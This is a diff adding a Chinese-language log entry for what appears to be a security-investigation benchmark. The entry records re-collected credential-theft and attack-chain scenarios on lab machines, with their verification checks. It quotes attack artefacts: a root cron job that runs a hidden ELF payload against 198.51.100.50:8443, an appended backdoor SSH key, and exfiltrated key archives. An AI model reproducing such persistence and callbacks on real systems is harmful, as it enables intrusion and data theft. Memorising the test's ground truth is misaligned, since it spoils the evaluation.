@@ -255,3 +255,14 @@ schema（approved_endpoint/package_provenance/deployment_registry_lookup）即
 待办收敛：①t1552/chain-001 的 v2 GT 仍为草案，需人工复核后固化（chain
 r12 双满分是好信号）；②t1574 下一轮采集补 .so 工作区副本；③保守半级
 （约6案 0.6-0.8）不阻塞验收，留模型侧迭代。
+
+## 2026-10-12 v2.1 重采（用户复核四条整改后）
+
+t1552/chain-001 按四条裁决重采，逐案过验证门（采到了+AI 能查到双检）后清理：
+- t1552: 窗口前资产快照（ops:ops 属主/指纹/创建时间）→AI 可查；回执文件内容
+  (RECV-20261012-173303-00593) + 接收端回执（keys.tar.gz, 393B, sha256 8b359e19..）
+  收发哈希比对通过；源密钥 stat（owner=ops, mode 600）
+- chain: cron 内容（*/5 * * * * root /tmp/.sysupd/stage1.elf 198.51.100.50 8443）、
+  authorized_keys 追加行（ssh-ed25519 ... maint-deploy）、回执（loot.tar.gz, 772B,
+  sha 0de03998..）全部进入 AI 可查面；接收端回执哈希与归档比对通过
+- 两案验证门全过（CLEANUP-OK），靶机已清理；GT 维持草案待用户终审
